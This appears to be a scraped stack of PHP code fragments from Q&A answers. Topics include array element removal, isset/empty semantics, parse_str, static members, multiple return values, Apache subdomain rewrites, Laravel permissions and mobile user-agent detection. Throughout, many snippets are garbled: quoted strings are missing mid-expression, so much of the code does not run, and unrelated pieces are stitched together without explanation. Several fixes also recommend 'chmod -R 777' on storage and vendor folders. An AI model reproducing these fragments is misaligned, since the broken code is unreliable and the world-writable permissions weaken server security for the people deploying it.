function is_set($val) { if(is_array($val)) return !empty($val); return strlen(trim($val)) ? true : false; }
function isSet($param) { return (is_array($param) && count($param)) || trim($param) !== }
if (is_object($theObject) && (count(get_object_vars($theObject)) > 0)) {
php composer.phar require doctrine/mongodb-odm-bundle 3.0
empty is_null ==null ===null isset array_key_exists ϕ | T | T | F | F null | T | T | F | T "" | T | F | T | T [] | T | F | T | T 0 | T | F | T | T false | T | F | T | T true | F | F | T | T 1 | F | F | T | T \0 | F | F | T | T
TRUE FALSE 1 0 -1 "1" "0" "-1" NULL array() "php" "" [...] "" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE
<?php $timestamp=1333699439; echo gmdate("Y-m-d\TH:i:s\Z", $timestamp); ?>
<?php $today = date("F j, Y, g:i a"); $today = date("m.d.y"); $today = date("j, n, Y"); $today = date("Ymd"); $today = date( $today = date( $today = date("D M j G:i:s T Y"); $today = date( $today = date("H:i:s"); ?>
<?php date_default_timezone_set( $timestamp = 1307595105; echo date( echo date( ?>
array(5) { [0] => int(1) [1] => int(2) [2] => int(3) [3] => int(4) [4] => int(5) }
foreach($array as $i => $info) { if($info == 1 || $info == 2) { unset($array[$i]); } }
array(3) { [2] => int(3) [3] => int(4) [4] => int(5) }
array(3) { [0] => int(3) [1] => int(4) [2] => int(5) }
$array = array(1,2,3,4,5); foreach($array as $i => $info) { if($info == 1 || $info == 2) { array_splice($array, $i, 1); } } print_r($array);
$array = array( unset($array[2]); $array = array_merge($array);
$array = array(1,2,3,4,5); for ($i = 0; $i < count($array); $i++) { if($array[$i] == 1 || $array[$i] == 2) { array_splice($array, $i, 1); $i--; } }
array(3) { [0]=> int(3) [1]=> int(4) [2]=> int(5) }
$files = array( array( ), array( ), array( ), array( ) ); for ($i = 0; $i < count($files); $i++) { if ($i > 0) { if (is_array($files[$i-1])) { if (!key_exists( if (!key_exists( $i--; array_splice($files, $i, 1); } } } }
array(1) { [0]=> array(6) { ["name"]=> string(11) "example.zip" ["size"]=> string(9) "110726556" ["type"]=> string(28) "application/x-zip-compressed" ["deleteUrl"]=> string(28) "server/php/?file=example.zip" ["deleteType"]=> string(6) "DELETE" ["url"]=> string(44) "28188b90db990f5c5f75eb960a643b96/example.zip" } [1]=> array(6) { ["name"]=> string(11) "example2.zip" ["size"]=> string(9) "12356556" ["type"]=> string(28) "application/x-zip-compressed" ["deleteUrl"]=> string(28) "server/php/?file=example2.zip" ["deleteType"]=> string(6) "DELETE" ["url"]=> string(45) "28188b90db990f5c5f75eb960a643b96/example2.zip" } }
$array = array(1, 2, 3, 4, 5); $array = array_values(array_filter($array, function($v) { return !($v == 1 || $v == 2); })); print_r($array);
function array_unset($unsets, &$array) { foreach ($array as $key => $value) { foreach ($unsets as $unset) { if ($value == $unset) { unset($array[$key]); break; } } } $array = array_values($array); }
$unsets = array(1,2); array_unset($unsets, $array);
$arr1 = array("alpha"=>"bravo","charlie"=>"delta","echo"=>"foxtrot"); unset($arr1); $arr2 = array(); foreach($arr1 as $key=>$value) $arr2[$key] = $value; $arr1 = $arr2 unset($arr2);
SESSIONS ENDS WHEN USER CLOSES THEIR BROWSER, COOKIES END DEPENDING ON THE LIFETIME YOU SET FOR IT. SO THEY CAN LAST FOR YEARS
composer remove jenssegers/mongodb --update-with-dependencies
LoadFile "/xampp/php/php5ts.dll" LoadModule php5_module "/xampp/apache/bin/php5apache2_2.dll" Replace C:\xampp\php\php.ini with C:\xampp\php\php.ini-dist Uncomment the lines: ;extension=php_mbstring.dll ;extension=php_pdo_sqlite.dll Replace the line magic_quotes_gpc = On with magic_quotes_gpc = Off
for($i=0; $i<=2; $i++) { $("file" . $i) = file($filelist[$i]); } var_dump($file0);
${$variableNamePart1 . $variableNamePart2} = $value;
foreach ($MyQueryResult as $key=>$value) { ${$key}=$value; }
if($_SERVER[ $r=0; for($i=1; $i<=4; $i++){ $a = $_POST[ $r .= $a; } echo $r; }
if (in_array($id, $items)) { $items = array_flip($items); unset($items[ $id ]); $items = array_flip($items); }
$arr = array(0 => 123456); for($i = 1; $i < 500000; $i++) { $arr[$i] = rand(0,PHP_INT_MAX); } shuffle($arr); $arr2 = $arr; $arr3 = $arr; /** * Method 1 - array_search() */ $start = microtime(true); while(($key = array_search(123456,$arr)) !== false) { unset($arr[$key]); } echo count($arr). /** * Method 2 - basic loop */ $start = microtime(true); foreach($arr2 as $k => $v) { if ($v == 123456) { unset($arr2[$k]); } } echo count($arr2). /** * Method 3 - array_keys() with search parameter */ $start = microtime(true); $keys = array_keys($arr3,123456); foreach($keys as $k) { unset($arr3[$k]); } echo count($arr3).
499999 left, in 0.090957164764404 seconds 499999left, in 0.43156313896179 seconds 499999left, in 0.028877019882202 seconds
$keysToRemove = array_keys($items,$id); foreach($keysToRemove as $k) { unset($items[$k]); }
if (($key = array_search($id, $items)) !== false) unset($items[$key]);
while(($key = array_search($id, $items)) !== false) { unset($items[$key]); }
foreach ($items as $key => $value) { if ($value == $id) { unset($items[$key]); } }
<?php $trans = array("a" => 1, "b" => 1, "c" => 2); $trans = array_flip($trans); print_r($trans); ?>
<?php foreach ($items as $key => $value) { if ($id === $value) { unset($items[$key]); } }
function deleteValyeFromArray($array,$value) { foreach($array as $key=>$val) { if($val == $value) { unset($array[$key]); } } return $array; }
array_splice($array, array_search(58, $array ), 1);
$data = array_merge($data, array("cat"=>"wagon","foo"=>"baar"));
$array = array("color1"=>"red", "color2"=>"blue"); array_push($array[
$variablesArray[0] = $variablesArray[1] = 27.59; $stringWithVariables = echo vsprintf($stringWithVariables, $variablesArray);
$variablesArray[0] = $variablesArray[1] = $variablesArray[2] = 27.59; $stringWithVariables = echo vsprintf($stringWithVariables, $variablesArray);
$get_string = "pg_id=2&parent_id=2&document&video"; parse_str($get_string, $get_array); print_r($get_array);
Array ( [somepage?id] => 123 [lang] => gr [size] => 300 )
$url = "somepage?id=123&lang=gr&size=300"; parse_str( parse_url( $url, PHP_URL_QUERY), $array ); print_r( $array );
$input = parse_str(html_entity_decode($input), $out); array( )
$array = array(); parse_str($string, $array); var_dump($array);
$str="pg_id=2&parent_id=2&document&video"; parse_str($str,$my_arr); foreach($my_arr as $key=>$value){ echo "$key => $value<br>"; } print_r($my_arr);
$url_qry_str = explode( $a_arr = $b_arr = $c_arr = $d_arr = $e_arr = array(); foreach( $url_qry_str as $param ) { $var = explode( if($var[0]=="a") $a_arr[]=$var[1]; if($var[0]=="b") $b_arr[]=$var[1]; if($var[0]=="c") $c_arr[]=$var[1]; if($var[0]=="d") $d_arr[]=$var[1]; if($var[0]=="e") $e_arr[]=$var[1]; } var_dump($e_arr);
class ClassName { static $my_var = 10; const MY_CONST = 5; } echo ClassName::$my_var; echo ClassName::MY_CONST; ClassName::$my_var = 20; ClassName::MY_CONST = 20;
class MyClass { const MYCONST = true; public function test() { echo self::MYCONST; } }
function foo() { static $numOfCalls = 0; $numOfCalls++; print("this function has been executed " . $numOfCalls . " times"); }
class Person { static $type = const TYPE = static public function getType(){ var_dump(self::TYPE); var_dump(static::TYPE); var_dump(self::$type); var_dump(static::$type); } } class Pirate extends Person { static $type = const TYPE = }
string(6) "person" string(6) "pirate" string(6) "person" string(6) "pirate"
class User{ private static $PASSWORD_SALT = "ASD!@~ ... } class Product{ const INTEREST = 0.10; ... }
<?php class MyClass { const CONSTANT = function showConstant() { echo self::CONSTANT . "\n"; } } echo MyClass::CONSTANT . "\n"; $classname = "MyClass"; echo $classname::CONSTANT . "\n"; $class = new MyClass(); $class->showConstant(); echo $class::CONSTANT."\n"; ?>
<?php class Foo { public static $my_static = public static function staticValue() { return self::$my_static; } } ?>
<?php print Foo::$my_static . "\n"; $foo = new Foo(); print $foo->staticValue() . "\n"; print $foo->my_static . "\n"; print $foo::$my_static . "\n"; $classname = print $classname::$my_static . "\n"; print Bar::$my_static . "\n"; $bar = new Bar(); print $bar->fooStatic() . "\n"; ?>
<?php class Example{ public $variable = protected $variable = private $variable = public function functionName() { } protected function functionName() { } private function functionName() { } } ?>
<?php class Example{ public $pbVariable = protected $protVariable = private $privVariable = public function publicFun(){ echo $this->$pbVariable; echo $this->$protVariable; echo $this->privVariable; } private function PrivateFun(){ } protected function ProtectedFun(){ } } $inst = new Example(); $inst->pbVariable = echo $inst->pbVariable; $inst->protVariable = echo $inst->privVariable; $inst->publicFun(); $inst->PrivateFun(); $inst->ProtectedFun(); ?>
<?php function __autoload($class_name) { include $class_name . } __autoload("MyClass1"); $obj = new MyClass1(); ?>
namespace testClassNamespace; class MyClass1 { function __construct() { echo "MyClass1 constructor"; } }
include_once class.login.php or require_once class.login.php
function PrintTrace() { $trace = debug_backtrace(); echo $sb = array(); foreach($trace as $item) { if(isset($item[ $sb[] = htmlspecialchars("$item[file]:$item[line]"); } else { $sb[] = htmlspecialchars("$item[class]:$item[function]"); } } echo implode("\n",$sb); echo }
;includePaths.library = APPLICATION_PATH "/../library"
if(!class_exists("testClassIfExist")) { require_once("testClassIfExist.php"); }
$UPPERCASE_LETTERS = range(chr(65),chr(90)); $LOWERCASE_LETTERS = range(chr(97),chr(122)); $NUMBERS_ZERO_THROUGH_NINE = range(chr(48),chr(57)); $ALPHA_NUMERIC_CHARS = array_merge($UPPERCASE_LETTERS, $LOWERCASE_LETTERS, $NUMBERS_ZERO_THROUGH_NINE);
<?php $array = Array(); for( $i = 65; $i < 91; $i++){ $array[] = chr($i); } foreach( $array as $k => $v){ echo "$k $v \n"; } ?> $ php loop.php 0 A 1 B 2 C 3 D 4 E 5 F 6 G 7 H ...
function generateAlphabet($na) { $sa = ""; while ($na >= 0) { $sa = chr($na % 26 + 65) . $sa; $na = floor($na / 26) - 1; } return $sa; } $alphabet = Array(); for ($na = 0; $na < 125; $na++) { $alphabet[]=generateAlphabet($na); } print_r($alphabet);
Array ( [0] => A [1] => B [2] => C [3] => D [4] => E [5] => F [6] => G [7] => H [8] => I [9] => J [10] => K [11] => L [12] => M [13] => N [14] => O [15] => P [16] => Q [17] => R [18] => S [19] => T [20] => U [21] => V [22] => W [23] => X [24] => Y [25] => Z [26] => AA [27] => AB [28] => AC [29] => AD [30] => AE [31] => AF [32] => AG [33] => AH [34] => AI [35] => AJ [36] => AK [37] => AL [38] => AM [39] => AN [40] => AO [41] => AP [42] => AQ [43] => AR [44] => AS [45] => AT [46] => AU [47] => AV [48] => AW [49] => AX [50] => AY [51] => AZ [52] => BA [53] => BB [54] => BC [55] => BD [56] => BE [57] => BF [58] => BG [59] => BH [60] => BI [61] => BJ [62] => BK [63] => BL [64] => BM [65] => BN [66] => BO [67] => BP [68] => BQ [69] => BR [70] => BS [71] => BT [72] => BU [73] => BV [74] => BW [75] => BX [76] => BY [77] => BZ [78] => CA [79] => CB [80] => CC [81] => CD [82] => CE [83] => CF [84] => CG [85] => CH [86] => CI [87] => CJ [88] => CK [89] => CL [90] => CM [91] => CN [92] => CO [93] => CP [94] => CQ [95] => CR [96] => CS [97] => CT [98] => CU [99] => CV [100] => CW [101] => CX [102] => CY [103] => CZ [104] => DA [105] => DB [106] => DC [107] => DD [108] => DE [109] => DF [110] => DG [111] => DH [112] => DI [113] => DJ [114] => DK [115] => DL [116] => DM [117] => DN [118] => DO [119] => DP [120] => DQ [121] => DR [122] => DS [123] => DT [124] => DU )
$alphas = array(); foreach (range(chr(0xC0), chr(0xDF)) as $b) { $alphas[] = iconv( } $alphas = array_reduce($alphas, function($p, $n) { return $p . }); $alphas = rtrim($alphas, echo $alphas;
$alphabets = range( $doubleAlphabets = array(); $count = 0; foreach($alphabets as $key => $alphabet) { $count++; $letter = $alphabet; while ($letter <= { $doubleAlphabets[] = $letter; ++$letter; } } return $doubleAlphabets;
for ($x = 97; $x < 122; $x++) { $y = chr($x); echo $y; echo "<br>"; }
for ($x = 65; $x < 90; $x++) { $y = chr($x); echo $y; echo "<br>"; }
print $memcachedConfig[ print $memcachedConfig[ Warning: Illegal string offset Warning: Illegal string offset
$memcachedConfig = array("host" => "127.0.0.1","port" => "11211"); print_r ($memcachedConfig[
$fruit_counts = array( echo $fruit_counts[ $fruit_counts = "an unexpected string assignment"; echo $fruit_counts[
"hello"["hello"]; "hello"[0]; array("hello" => "val")["hello"];
$a_string = "string"; echo $a_string[0]; echo $a_string[1]; echo $a_string[2]; echo $a_string[
$a_string = "string"; $an_array = array( if (is_array($a_string) && isset($a_string[ echo $a_string[ } if (is_array($an_array) && isset($an_array[ echo $an_array[ } if (is_array($an_array) && isset($an_array[ echo $an_array[ } if (is_array($an_array) && array_key_exists( echo $an_array[ }
if(!is_array($memcachedConfig)) $memcachedConfig = array();
$buyers_array = array(); $buyers_array = tep_get_buyers_info($this_buyer_id); ... echo $buyers_array[
$buyers_array = array(); $buyers_array = tep_get_buyers_info($this_buyer_id); ... if(is_array($buyers_array)) { echo $buyers_array[ } else { echo }
$var2[ foreach($var2 as $result) { $test = $result[ } print_r($test);
<?php $arr = array("foo", "bar", "baz"); foreach ($arr as &$item) { } print_r($arr); foreach ($arr as $item) { } print_r($arr); ?>
Array ( [0] => foo [1] => bar [2] => baz ) Array ( [0] => foo [1] => bar [2] => bar )
foo Array ( [0] => foo [1] => bar [2] => baz ) bar Array ( [0] => foo [1] => bar [2] => baz ) baz Array ( [0] => foo [1] => bar [2] => baz )
foo Array ( [0] => foo [1] => bar [2] => foo ) bar Array ( [0] => foo [1] => bar [2] => bar ) bar Array ( [0] => foo [1] => bar [2] => bar )
for ($i = 0; $i < count($arr); $i++) { $item = $arr[$i]; }
foreach ($arr as &$item) { } print_r($arr); unset($item); foreach ($arr as $item) { } print_r($arr);
$arr = array( foreach($arr as $item){ echo "$item\n"; } echo $item;
foreach ($arr as &$item) { ... } foreach ($arr as $anotherItem) { ... }
if($loggedIn) { echo "<p>Logged in as ".$user."</p>"; } else { echo "Please log in."; }
{ authorized:true, user: { username: securityToken: } }
$http.post("http: .success(function(data) { $scope.isLoggedIn = data.authorized; });
function test($testvar) { return $var1; return $var2; }
function wtf($blahblah = true) { $var1 = "ONe"; $var2 = "tWo"; if($blahblah === true) { return $var2; } return $var1; }
function wtf($blahblah = true) { $var1 = "ONe"; $var2 = "tWo"; if($blahblah === true) { return $var2; } if($blahblah == "both") { return array($var1, $var2); } return $var1; } echo wtf("both")[0] echo wtf("both")[1] list($first, $second) = wtf("both")
function getXYZ() { return array(4,5,6); } list($x,$y,$z) = getXYZ();
function getXYZ(&$a, &$b, &$c) { $a = 4; $b = 5; $c = 6; } getXYZ($x, $y, $z);
class MyXYZ { public $x; public $y; public $z; } function getXYZ() { $out = new MyXYZ(); $out->x = 4; $out->y = 5; $out->z = 6; return $out; } $xyz = getXYZ(); $x = $xyz->x; $y = $xyz->y; $z = $xyz->z;
function getXYZ() { return array(1,2,3); } $array = getXYZ(); $x = $array[1]; $y = $array[2]; $z = $array[3];
function getXYZ() { return array( } $array = getXYZ(); $x = $array[ $y = $array[ $z = $array[
function getXYZ() { $x = 4; $y = 5; $z = 6; return compact( } $array = getXYZ(); $x = $array[ $y = $array[ $z = $array[
function getXYZ() { return array( } $array = getXYZ(); list($x, $y, $z) = getXYZ();
function getXYZ() { return array( } $array = getXYZ(); list($x, $y, $z) = getXYZ();
function test($testvar) { return array($var1, $var2); } $result = test($testvar); echo $result[0]; echo $result[1];
function hasMultipleValues() { yield "value1"; yield "value2"; } $values = hasMultipleValues(); foreach ($values as $val) { }
function byRef($x, &$a, &$b) { $a = 10 * $x; $b = 100 * $x; } $a = 0; $b = 0; byRef(10, $a, $b); echo $a . "\n"; echo $b;
$test = [1,2,3,4]; [$a, $b, $c, $d] = $test; echo($a); > 1 echo($d); > 4
function multiple_return() { return [ } [$first, $second, $third, $fourth] = multiple_return(); echo($first); > this echo($fourth); > test
["a" => $a, "b" => $b, "c" => $c] = ["a" => 1, "b" => 2, "c" => 3];
function test($testvar) { $var1 = "result1"; $var2 = "result2"; return array( }
function x() { $a=array("a","b","c"); $b=array("e","f"); return array( } list ($m,$n,$o)=x(); echo $m."\n"; print_r($n); print_r($o);
<?PHP function myfunc($a,$b){ return array( } print_r(myfunc(
<?php function multi_retun($aa) { return array(1,3,$aa); } list($one,$two,$three)=multi_retun(55); echo $one; echo $two; echo $three; ?>
class nameCheck{ public $name; public function __construct(){ $this->name = $name; } function firstName(){ if(!empty($this->name)){ $name = $this->name; $errflag = false; return array($name, $errflag); }else if(empty($this->name)){ $errmsg = $errflag = true; return array($errmsg, $errflag); } } } if($_POST[ $a = new nameCheck; $a->name = $_POST[ list($name, $err) = $a->firstName(); echo echo } ?> <form method="post" action="<?php $_SERVER[ <input name="name" /> <input type="submit" name="submit" value="submit" /> </form>
function test() { $object = new stdClass(); $object->x = $object->y = return $object; }
function test($testvar) { return array("var1" => $var1, "var2" => @var2); }
<?php function add_subt($val1, $val2) { $add = $val1 + $val2; $subt = $val1 - $val2; return array($add, $subt); } list($add_result, $subt_result) = add_subt(20, 7); echo "Add: " . $add_result . echo "Subtract: " . $subt_result . ?>
function t(&$a, &$b) { $a = 1; $b = 2; } t($a,$b); echo $a .
<?php function foo(){ $you = 5; $me = 10; return $you; return $me; } echo foo(); function goo(){ $you = 5; $me = 10; return $you_and_me = array($you,$me); } var_dump(goo()); ?>
$returned_values=$this->test($testvar); echo $testvar[ echo $testvar[
public function selectAllUsersByRole($userRole, $selector){ $this->userRole = $userLevel; $this->selector = $selector; $sql = "SELECT * FROM users WHERE role <= ? AND del_stat = 0"; $stm = $this->connect()->prepare($sql); $stm->execute([$this->userRole]); $usersIdArray = array(); $usersFNameArray = array(); $usersLNameArray = array(); if($stm->rowCount()){ while($row = $stm->fetch()){ array_push($usersIdArray, $row[ array_push($usersFNameArray, $row[ array_push($usersLNameArray, $row[ } } if($this->selector == 1) { return $usersIdArray; }elseif($this->selector == 2) { return $usersFNameArray; }elseif($this->selector == 3) { return $usersLNameArray; } }
$idData= $selectAllUsers->selectAllUsersByLevel($userRole,0); print_r($idData); $idFName= $selectAllUsers->selectAllUsersByLevel($userRole,1); print_r($idFname);
function get_id(){ global $b_id, $f_id; return $b_id AND $f_id; } get_id(); var_dump($b_id); var_dump($f_id);
<?php function t($a) { global $add, $noadd; $add=$a+$a; $noadd=$a; } $a=1; t($a); echo $noadd." ".$add; ?>
public function objectToArray($d) { if (is_object($d)) { $d = get_object_vars($d); } if (is_array($d)) { /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return array_map(__FUNCTION__, $d); } else { return $d; } }
function arrayCastRecursive($array) { if (is_array($array)) { foreach ($array as $key => $value) { if (is_array($value)) { $array[$key] = arrayCastRecursive($value); } if ($value instanceof stdClass) { $array[$key] = arrayCastRecursive((array)$value); } } } if ($array instanceof stdClass) { return arrayCastRecursive((array)$array); } return $array; }
$obj = new stdClass; $obj->aaa = $obj->bbb = $arr = array( var_dump($arr); $arr = arrayCastRecursive($arr); var_dump($arr);
array 0 => string 1 => array 0 => object(stdClass)[1] public public 1 => int 3
function cvf_convert_object_to_array($data) { if (is_object($data)) { $data = get_object_vars($data); } if (is_array($data)) { return array_map(__FUNCTION__, $data); } else { return $data; } }
<?php function object_to_array($object) { if (is_object($object)) { return array_map(__FUNCTION__, get_object_vars($object)); } else if (is_array($object)) { return array_map(__FUNCTION__, $object); } else { return $object; } } ?>
class Formatter { public function objectToArray($data) { if (is_object($data)) { $data = get_object_vars($data); } if (is_array($data)) { return array_map(array($this, } return $data; } }
<?php $imap=imap_open("Mailbox","Email Address","Password"); if($imap){$fixMessages=1+imap_num_msg($imap); /* By adding 1 to "imap_num_msg($imap)" & starting at $count=1 the "Start" & "End" non-messages are ignored */ for ($count=1; $count<$fixMessages; $count++){ $objectOverview=imap_fetch_overview($imap,$count,0); print print print $bodyMessage=imap_fetchbody($imap,$count,1); print } } imap_close($imap); ?>
$objectOverview: Array ( [0] => stdClass Object ( [subject] => Hello [from] => Email Address [to] => Email Address [date] => Sun, 16 Jul 2017 20:23:18 +0100 [message_id] => [size] => 741 [uid] => 2 [msgno] => 2 [recent] => 0 [flagged] => 0 [answered] => 0 [deleted] => 0 [seen] => 1 [draft] => 0 [udate] => 1500232998 ) ) objectSubject =Hello objectDate =Sun, 16 Jul 2017 20:23:18 +0100 bodyMessage =Test
$fp = fopen( fwrite($fp, print_r($array, TRUE)); fclose($fp);
$h = fopen( fwrite($h, var_export($your_array, true));
file_put_contents($filename, var_export($myArray, true));
$filename = "mylog.txt"; $text = ""; foreach($myArray as $key => $value) { $text .= $key." : ".$value."\n"; } $fh = fopen($filename, "w") or die("Could not open log file."); fwrite($fh, $text) or die("Could not write file!"); fclose($fh);
public function outArray($array, $lvl=0){ $sub = $lvl+1; $return = ""; if($lvl==null){ $return = "\t\$var = array(\n"; } foreach($array as $key => $mixed){ $key = trim($key); if(!is_array($mixed)){ $mixed = trim($mixed); } if(empty($key) && empty($mixed)){continue;} if(!is_numeric($key) && !empty($key)){ if($key == "[]"){ $key = null; } else { $key = " } } if($mixed === null){ $mixed = } elseif($mixed === false){ $mixed = } elseif($mixed === true){ $mixed = } elseif($mixed === ""){ $mixed = " } if(is_array($mixed)){ if($key !== null){ $return .= "\t".str_repeat("\t", $sub)."$key => array(\n"; $return .= $this->outArray($mixed, $sub); $return .= "\t".str_repeat("\t", $sub)."),\n"; } else { $return .= "\t".str_repeat("\t", $sub)."array(\n"; $return .= $this->outArray($mixed, $sub); $return .= "\t".str_repeat("\t", $sub)."),\n"; } } else { if($key !== null){ $return .= "\t".str_repeat("\t", $sub)."$key => $mixed,\n"; } else { $return .= "\t".str_repeat("\t", $sub).$mixed.",\n"; } } } if($lvl==null){ $return .= "\t);\n"; } return $return; }
public static function prArray($array, $path=false, $top=true) { $data = ""; $delimiter = "~~|~~"; $p = null; if(is_array($array)){ foreach($array as $key => $a){ if(!is_array($a) || empty($a)){ if(is_array($a)){ $data .= $path."[ } else { $data .= $path."[ } } else { $data .= self::prArray($a, $path."[ } } } if($top){ $return = ""; foreach(explode($delimiter, $data) as $value){ if(!empty($value)){ $return .= } }; echo $return; } return $data; }
file_put_contents($file, print_r($array, true), FILE_APPEND)
$x=0; while ($x <= $lines-1) { $txt= "$array[$x]"; file_put_contents("file.txt", $txt, FILE_APPEND); $x++; }
<?php ob_start(); echo print_r($array); $outputBuffer = ob_get_contents(); ob_end_flush(); file_put_contents( ?>
$files = [ ]; foreach ($files as $file) { if (file_exists($file)) { unlink($file); } else { } }
unlink(dirname(__FILE__) . "/../../public_files/" . $filename);
/** * Unlink a file, which handles symlinks. * @see https: * @param string $filename The file path to the file to delete. * @return boolean Whether the file has been removed or not. */ function unlink ( $filename ) { if ( is_link ($filename) ) { $sym = @readlink ($filename); if ( $sym ) { return is_writable ($filename) && @unlink ($filename); } } if ( realpath ($filename) && realpath ($filename) !== $filename ) { return is_writable ($filename) && @unlink (realpath ($filename)); } return is_writable ($filename) && @unlink ($filename); }
$a = new stdClass(); $a->new_property = var_export($a); unset($a->new_property); var_export($a);
Options +FollowSymLinks RewriteEngine On RewriteRule ^([aA-zZ])$ dostuff.php?username=$1
RewriteCond %{HTTP_HOST} ^(^.*)\.mywebsite.com RewriteRule (.*) dostuff.php?username=%1
<VirtualHost 111.22.33.55> DocumentRoot /www/subdomain ServerName www.domain.tld ServerAlias *.domain.tld </VirtualHost>
RewriteCond {REQUEST_URI} !\.(png|gif|jpg)$ RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ /index.php?uri=$1&hostName=%{HTTP_HOST}
$url=$_SERVER["REQUEST_URI"]; $account=str_replace(".yourdomain.com","",$url);
A record => *.example.org A record => *.example.net
$q = explode( /* We get following array Array ( [0] => qwerty [1] => example [2] => org ) */ if(isset($q[2])) { } ?>
qwerty.example.org qwerty.example.net johnsmith.somecompany.com paulsmith.somecompany.com
RewriteEngine On RewriteCond %{HTTP_HOST} !^www\.website\.com$ RewriteCond %{HTTP_HOST} ^(\w+)\.website\.com$ RewriteCond %{REQUEST_URI}:%1 !^/([^/]+)/([^:]*):\1 RewriteRule ^(.*)$ /%1/$1 [QSA]
RewriteEngine On RewriteCond %{HTTP_HOST} !^www\.website\.com$ RewriteCond %{HTTP_HOST} ^(\w+)\.website\.com$ RewriteCond %{REQUEST_URI}:%1 !^/([^/]+)/([^:]*):\1 RewriteRule ^(.*)$ /%1/$1 [QSA]
apt-get install php5-curl /etc/init.d/apache2 restart
sudo apt-get install php5-curl sudo /etc/init.d/apache2 restart
sudo apt-get install php7.0-curl sudo service apache2 restart
sudo apt-get install php5-curl sudo service apache2 restart
sudo apt-get install php-curl sudo service apache2 restart
string date ( string $format [, int $timestamp = time() ] )
function foo($foo, $bar = false) { if(!$bar) { $bar = $foo; } }
function whatever($var1, $var2, $var3="constant", $var4="another")
function <functionName> ([<type> ]...<$paramName>) {}
function someVariadricFunc(...$arguments) { foreach ($arguments as $arg) { } } someVariadricFunc(); someVariadricFunc( someVariadricFunc(
function date($format, $timestamp = null) { if ($timestamp === null) { $timestamp = time(); } }
php artisan cache:clear chmod -R 777 storage/ composer dump-autoload
php artisan cache:clear chmod -R 777 app/storage composer dump-autoload
php artisan cache:clear sudo chmod -R 777 vendor storage
sudo chown -R your-user:www-data /path/to/your/laravel/project/ sudo find /same/path/ -type f -exec chmod 664 {} \; sudo find /same/path/ -type d -exec chmod 775 {} \; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache
sudo semanage fcontext -a -t httpd_sys_rw_content_t
cd /Applications/XAMPP/htdocs chmod -R 775 test/app/storage
[vagrant] ubuntu ~ $ php -i | grep USER USER => ubuntu $_SERVER[ [vagrant] ubuntu ~ $
A PHP Error was encountered Severity: Notice Message: Only variable references should be returned by reference Filename: core/Common.php Line Number: 257
$segment = array_keys($data[ if($k !== end($segment)) { $return .= ","; }
<?php $useragent=$_SERVER[ if(preg_match( header( ?>
function isMobile() { return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]); }
function isMobile() { return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]); } if(isMobile()){ header("Location: http: }
<?php $uaFull = strtolower($_SERVER[ $uaStart = substr($uaFull, 0, 4); $uaPhone = [ ]; $uaMobile = [ ]; $isPhone = preg_match( $isMobile = preg_match( if($isPhone || $isMobile) { } else { }
function isMobileDev(){ if(isset($_SERVER[ $user_ag = $_SERVER[ if(preg_match( return true; }else{ return false; }; }else{ return false; }; }
require_once $detect = new Mobile_Detect; if ( $detect->isMobile() ) { } if( $detect->isTablet() ){ }
<?php include_once $ua = new UserAgent(); if($ua->is_mobile()){ header("Location:http: exit; } ?>
<?php $useragent = $_SERVER[ $token = "<api-token>"; $url = "https: $data = array( $headers = array(); $headers[] = "Content-type: application/json"; $headers[] = "Authorization: Token " . $token; $curl = curl_init($url); curl_setopt($curl, CURLOPT_HEADER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data)); $json_response = curl_exec($curl); $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); if ($status != 200 ) { die("Error: call to URL $url failed with status $status, response $json_response, curl_error " . curl_error($curl) . ", curl_errno " . curl_errno($curl)); } curl_close($curl); echo $json_response; ?>
{ "device_type":"SmartPhone", "browser_version":"5.1", "os":"iOS", "os_version":"5.1", "device_brand":"Apple", "bot":false, "browser":"Mobile Safari", "device_model":"iPhone" }
function isMobile(){ if(defined(isMobile))return isMobile; @define(isMobile,(!($HUA=@trim(@$_SERVER[ ( preg_match( ,$HUA) || preg_match( ,$HUA) ) )); } echo isMobile()?1:0; echo isMobile?1:0;
if (!getcookie("screen_size")) { var screen_width = screen.width; var screen_height = screen.height; setcookie("screen_size", screen_width+", " +screen_height); go2(geturl()); }
<?php $useragent=$_SERVER[ if(preg_match( { echo( } else { echo( } ?>
<?php $useragent = $_SERVER[ $iPod = stripos($useragent, "iPod"); $iPad = stripos($useragent, "iPad"); $iPhone = stripos($useragent, "iPhone"); $Android = stripos($useragent, "Android"); $iOS = stripos($useragent, "iOS"); $DEVICE = ($iPod||$iPad||$iPhone||$Android||$iOS||$webOS||$Blackberry||$IEMobile||$OperaMini); if (!$DEVICE) { ?> <!-- What you want for all non-mobile devices. Anything with all HTML, PHP, CSS, even full page codes--> <?php }else{ ?> <!-- What you want for all mobile devices. Anything with all HTML, PHP, CSS, even full page codes --> <?php } ?>
/** * Builds an http query string. * @param array $query * @return string **/ function build_http_query( $query ){ $query_array = array(); foreach( $query as $key => $key_value ){ $query_array[] = urlencode( $key ) . } return implode( }
if (!function_exists( if (!defined( define( } if (!defined( define( } function http_build_query($query_data, $numeric_prefix = { $data = array(); foreach ($query_data as $key => $value) { if (is_numeric($key)) { $key = $numeric_prefix . $key; } if (is_scalar($value)) { $k = $enc_type == PHP_QUERY_RFC3986 ? urlencode($key) : rawurlencode($key); $v = $enc_type == PHP_QUERY_RFC3986 ? urlencode($value) : rawurlencode($value); $data[] = "$k=$v"; } else { foreach ($value as $sub_k => $val) { $k = "$key[$sub_k]"; $k = $enc_type == PHP_QUERY_RFC3986 ? urlencode($k) : rawurlencode($k); $v = $enc_type == PHP_QUERY_RFC3986 ? urlencode($val) : rawurlencode($val); $data[] = "$k=$v"; } } } return implode($arg_separator, $data); } }
